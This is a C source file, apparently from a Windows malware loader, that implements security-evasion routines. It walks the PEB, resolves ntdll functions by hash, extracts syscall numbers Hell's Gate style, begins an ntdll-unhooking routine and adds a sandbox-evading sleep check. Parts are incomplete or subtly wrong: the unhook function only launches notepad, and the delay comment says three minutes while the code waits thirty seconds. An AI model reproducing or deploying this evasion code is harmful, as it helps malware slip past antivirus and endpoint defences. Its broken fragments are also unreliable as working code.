#include <Windows.h>
#include <winternl.h>

#include "utils.h"
#include "crt.h"
#include "encryption.h"
#include "types.h"


//get the size of ntdll for buffer creation
SIZE_T GetNtdllSize(PBYTE pBase)
{
	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
	PIMAGE_NT_HEADERS pImgNtHdr = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);

	return pImgNtHdr->OptionalHeader.SizeOfImage;
}

//unhook ntdll if hooks are detected
VOID UnhookFromSuspendedProcess(PBYTE pBase)
{
	STARTUPINFO SI;
	PROCESS_INFORMATION PI;
	UnhookedSSNs ssns;
	PBYTE pBuffer = NULL;
	CHAR cProcessPath[39] = "C:\\Windows\\System32\\notepad.exe";
	
	//Zero the memory in the structures
	memset(&SI, 0x00, sizeof(STARTUPINFO));
	memset(&PI, 0x00, sizeof(PROCESS_INFORMATION));

	SI.cb = sizeof(STARTUPINFO);
	
	if (!CreateProcess(NULL, cProcessPath, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &SI, &PI))
	{
		EXITA(-1);
	}


}

//anti-debugging
BOOL DelayExecution()
{
	DWORD dwMillisSeconds = 0.5 * 60000; //wait for 3 minutes
	HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
	DWORD initialTime = 0;
	DWORD finalTime = 0;

	initialTime = GetTickCount();

	if (hEvent == NULL)
	{
		return FALSE;
	}

	if (WaitForSingleObject(hEvent, dwMillisSeconds) == WAIT_FAILED)
	{
		return FALSE;
	}

	finalTime = GetTickCount();
	CloseHandle(hEvent);

	if ((DWORD)finalTime - initialTime < dwMillisSeconds)
	{
		return FALSE;
	}
}


//implementation of GetPEBAddress
PPEB GetPEBAddress()
{
	return (PPEB)__readgsqword(0x60);
}

//implementation of GetLdrAddress
PPEB_LDR_DATA GetLdrAddress(PPEB peb)
{
	PPEB_LDR_DATA ldr_data_ptr = peb->Ldr;
	return ldr_data_ptr;
}

//implementation of GetModuleList
PLIST_ENTRY GetModuleList(PPEB_LDR_DATA ldr_ptr)
{
	PLIST_ENTRY list_ptr = &ldr_ptr->InMemoryOrderModuleList;
	return list_ptr;
}

//implementation of GetModuleBaseAddr
DWORD_PTR GetModuleBaseAddr(wchar_t target_dll[], PLIST_ENTRY head_node)
{
	DWORD_PTR module_addr = 0;
	PLIST_ENTRY temp = head_node->Flink;
	while (temp != head_node)
	{
		PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(temp, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		if (WCSNCMPA(target_dll, entry->FullDllName.Buffer, wcslen(target_dll)) == 0) {
			module_addr = (DWORD_PTR)entry->DllBase;
			break;  // Exit loop if the module is found
		}
		temp = temp->Flink;
	}

	return module_addr;
}

//implementation of GetNTHeader
PIMAGE_NT_HEADERS GetNTHeader(PBYTE pBase, PIMAGE_DOS_HEADER pDosHeader)
{
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pBase + pDosHeader->e_lfanew);
	return pNtHeader;
}

//implementation of GetImgExportDir
PIMAGE_EXPORT_DIRECTORY GetImgExportDir(PBYTE pBase, PIMAGE_NT_HEADERS pNtHeader)
{
	IMAGE_OPTIONAL_HEADER OptionalHeader = pNtHeader->OptionalHeader;
	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	
	return pImgExportDir;
}

//implementation of GetVxTableEntry
BOOL GetVxTableEntry(PBYTE pBase, PIMAGE_EXPORT_DIRECTORY pExportDir, PVX_TABLE_ENTRY pVxTableEntry)
{
	PDWORD pFunctionNameArr;
	PWORD pFunctionOrdinalArr;
	PDWORD pFunctionAddressArr;

	pFunctionNameArr = (PDWORD)(pBase + pExportDir->AddressOfNames);
	pFunctionOrdinalArr = (PWORD)(pBase + pExportDir->AddressOfNameOrdinals);
	pFunctionAddressArr = (PDWORD)(pBase + pExportDir->AddressOfFunctions);

	for (WORD i = 0; i < pExportDir->NumberOfNames; i++)
	{
		PCHAR pFunctionName = (PCHAR)(pBase + pFunctionNameArr[i]);
		PVOID pFunctionAddr = (PVOID)(pBase + pFunctionAddressArr[pFunctionOrdinalArr[i]]);

		if (djb2(pFunctionName) == pVxTableEntry->dwHash)
		{
			WORD idx = 0;
			//extract the syscall SSN
			pVxTableEntry->pAddress = pFunctionAddr;
			if (*((PBYTE)pFunctionAddr + idx) == 0x4c 
				&& *((PBYTE)pFunctionAddr + 1 + idx) == 0x8b
				&& *((PBYTE)pFunctionAddr + 2 + idx) == 0xd1
				&& *((PBYTE)pFunctionAddr + 3 + idx) == 0xb8
				) 
			{
				BYTE high = *((PBYTE)pFunctionAddr + 5 + idx);
				BYTE low = *((PBYTE)pFunctionAddr + 4 + idx);
				pVxTableEntry->wSystemCall = (high << 8 | low);
				break;
			}

			else if (*((PBYTE)pFunctionAddr + idx) == 0xe9) //syscall for jmp
			{
				UnhookFromSuspendedProcess(pBase);
			}
		}
	}
	return TRUE;
}

//implementation of VxMoveMemory
PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
	char* d = dest;
	const char* s = src;
	if (d < s)
		while (len--)
			*d++ = *s++;
	else {
		char* lasts = s + (len - 1);
		char* lastd = d + (len - 1);
		while (len--)
			*lastd-- = *lasts--;
	}
	return dest;
}


